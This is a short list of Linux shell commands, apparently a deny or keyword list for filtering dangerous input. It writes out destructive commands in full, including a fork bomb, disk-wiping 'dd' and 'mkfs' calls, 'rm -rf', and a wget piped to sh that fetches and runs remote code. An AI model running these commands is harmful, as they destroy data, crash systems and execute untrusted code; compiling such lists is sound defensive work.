shutdown
chmod
sudo
sudo su
apt
root
rm
rm -rf
:(){ :|: & };:
mkfs.ext4 /dev/sda1
> /dev/sda
dd if=/dev/random of=/dev/sda
mv ~ /dev/null
wget http://example.com/something -O – | sh —
wget
'shutdown'
